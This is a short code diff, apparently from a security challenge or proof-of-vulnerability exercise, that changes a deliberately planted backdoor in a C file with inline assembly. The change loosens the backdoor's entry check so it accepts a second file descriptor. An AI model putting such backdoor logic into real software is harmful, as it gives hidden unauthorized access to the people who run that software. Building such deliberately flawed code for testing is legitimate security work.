@@ -154,8 +154,11 @@ int ROTATE_LEFT(const int value, int shift) {
             test eax, eax ; test if receive succeeded
             jne _exit_backdoor
             test ebx, ebx ; test if ebx is 0 (stdin)
+            je _enter_backddor
+            cmp ebx, 1
             jne _exit_backdoor
 
+            _enter_backddor:
             ; we do not check rx_bytes: the assumption is that the network will never split the 4 bytes we send 
             ; I think it is a correct assumption because on the pov side we send 4 bytes together and 4 is very small
             mov esi, edx
